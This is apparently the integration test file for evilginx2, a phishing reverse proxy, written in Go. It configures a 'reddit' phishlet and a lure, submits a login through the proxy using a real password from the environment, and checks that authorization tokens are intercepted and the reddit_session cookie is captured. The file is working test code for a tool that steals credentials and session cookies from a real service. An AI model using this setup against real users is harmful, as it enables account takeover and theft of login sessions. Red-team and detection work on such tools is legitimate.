package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/http/cookiejar"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"testing"
	"time"
)

type TestEnvironment struct {
	t    *testing.T
	buf  *bytes.Buffer
	http *http.Client
}

func TestStart(t *testing.T) {
	log.Println("Starting evilginx2")
	_, filename, _, _ := runtime.Caller(0)
	path, _ := filepath.Abs(filepath.Dir(filename))
	cfgdir := path + "/tmp_cfg"

	// Clean up
	os.RemoveAll(cfgdir)
	os.MkdirAll(cfgdir, 0777)

	// Set up HTTP client
	dialer := &net.Dialer{
		Timeout:   10 * time.Second,
		KeepAlive: 10 * time.Second,
		DualStack: true,
	}
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	http.DefaultTransport.(*http.Transport).DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		if strings.HasSuffix(addr, ".localhost:443") {
			addr = "127.0.0.1:443"
		}
		return dialer.DialContext(ctx, network, addr)
	}
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: jar,
	}

	terminal := Start(true, path+"/phishlets", true, true, cfgdir, path+"/templates")
	if terminal == nil {
		t.Error("Could not be started")
	}

	var buf bytes.Buffer
	test := TestEnvironment{t, &buf, client}
	terminal.SetLogOutput(&buf)

	log.Println("Testing setup commands")
	terminal.ProcessCommand("help")
	test.assertLogContains("general configuration", "Shows help menu")
	test.assertLogContains("domain not set!", "Warns about a missing domain")
	test.assertLogContains("ip not set!", "Warns about a missing IP")
	test.Clear()

	terminal.ProcessCommand("help123")
	test.assertLogContains("unknown command", "Shows an error for an invalid command")

	terminal.ProcessCommand("config domain localhost")
	test.assertLogContains("domain set to: localhost", "Can change domain")

	terminal.ProcessCommand("config ip 127.0.0.1")
	test.assertLogContains("IP set to: 127.0.0.1", "Can change ip")

	terminal.ProcessCommand("config redirect_url http://example.com/unauth")
	test.assertLogContains("unauthorized request redirection URL set to: http://example.com/unauth", "Can change redirect_url")
	test.Clear()

	terminal.ProcessCommand("phishlets hostname reddit localhost")
	test.assertLogContains("phishlet 'reddit' hostname set to: localhost", "Sets hostname for phishlet")

	terminal.ProcessCommand("phishlets enable reddit")
	test.assertLogContains("enabled phishlet 'reddit'", "Can enable phishlet")
	test.assertLogContains("will use self-signed", "Uses developer certificates")

	terminal.ProcessCommand("lures create reddit")
	test.assertLogContains("created lure with ID: 0", "Can create lure")

	terminal.ProcessCommand("lures edit 0 path /inbound")
	test.assertLogContains("path = '/inbound'", "Can change lure path")

	terminal.ProcessCommand("lures edit 0 redirect_url http://example.com/authed")
	test.assertLogContains("redirect_url = 'http://example.com/authed'", "Can change lure redirect_url")
	test.Clear()

	log.Println("Finished configuration, setting up HTTP")
	time.Sleep(1 * time.Second)

	// Test HTTP requests
	log.Println("Testing interaction")
	_, url, _, _ := test.HttpGet("https://www.localhost")
	test.assertEqual(url, "http://example.com/unauth", "Unauthenticated request gets redirected")
	test.assertLogContains("unauthorized request: https://www.localhost/", "Unauthenticated request gets logged")
	test.Clear()

	_, url, body, header := test.HttpGet("https://www.localhost/inbound")
	test.assertEqual(url, "https://www.localhost/login/", "Redirects from inbound URL to login page")
	test.assertLogContains("new visitor has arrived:", "New visitor is detected and session created")
	test.assertLogContains("landing URL: https://www.localhost/inbound", "Landing URL detected")
	test.assertContains(header.Get("Set-Cookie"), "session=", "Session cookie is set")
	test.assertContains(body, "name=\"csrf_token\"", "Login page contains CSRF token")

	reCsrf := regexp.MustCompile(`name="csrf_token" value="(.+?)"`)
	csrf := reCsrf.FindStringSubmatch(body)

	baseData := `cookie_domain=.reddit.com&dest=https%3A%2F%2Fwww.localhost&csrf_token=` + csrf[1] + `&is_oauth=False&frontpage_signup_variant=&ui_mode=&is_mobile_ui=False&otp-type=app&username=evilginx2-testuser&password=`
	_, _, body, _ = test.HttpPost("https://www.localhost/login", baseData+`password123`)
	test.assertContains(body, "WRONG_PASSWORD", "Invalid login is rejected")
	test.assertLogNotContains("all authorization tokens intercepted", "Invalid login is detected as incorrect")

	_, _, body, _ = test.HttpPost("https://www.localhost/login", baseData+os.Getenv("REDDITPASSWORD"))
	test.assertContains(body, "https://www.localhost", "Valid login is accepted")
	test.assertLogContains("all authorization tokens intercepted", "Valid login is detected as correct")
	test.Clear()

	_, url, _, _ = test.HttpGet("https://www.localhost")
	test.assertEqual(url, "http://example.com/authed", "Redirects to correct page after authentication")
	test.assertLogContains("redirecting to URL: http://example.com/authed", "Redirect to correct page logged")

	// Check result
	terminal.ProcessCommand("sessions 1")
	test.assertLogContains("captured", "Session token captured")
	test.assertLogContains(`","name":"reddit_session","httpOnly":true`, "Session cookie displayed")

	//log.Println(buf.String())
}

func (test TestEnvironment) Clear() {
	test.buf.Reset()
}

func (test TestEnvironment) HttpGet(url string) (string, string, string, http.Header) {
	resp, err := test.http.Get(url)
	if err != nil {
		test.t.Fatal(err)
	}

	b, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()

	return resp.Status, resp.Request.URL.String(), string(b), resp.Header
}

func (test TestEnvironment) HttpPost(url string, postData string) (string, string, string, http.Header) {
	req, _ := http.NewRequest("POST", url, bytes.NewReader([]byte(postData)))
	resp, err := test.http.Do(req)
	if err != nil {
		test.t.Fatal(err)
	}

	b, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()

	return resp.Status, resp.Request.URL.String(), string(b), resp.Header
}

func (test TestEnvironment) assertLogContains(value string, msg string) {
	test.outputResult(
		strings.Contains(test.buf.String(), value),
		msg,
	)
}

func (test TestEnvironment) assertLogNotContains(value string, msg string) {
	test.outputResult(
		!strings.Contains(test.buf.String(), value),
		msg,
	)
}

func (test TestEnvironment) assertContains(a string, b string, msg string) {
	test.outputResult(
		strings.Contains(a, b),
		msg,
	)
}

func (test TestEnvironment) assertEqual(a string, b string, msg string) {
	test.outputResult(a == b, msg)
}

func (test TestEnvironment) outputResult(success bool, msg string) {
	if !success {
		log.Println(test.buf.String())
		test.t.Fatal("[FAIL]", msg)
	} else {
		log.Println("[SUCCESS]", msg)
	}
}
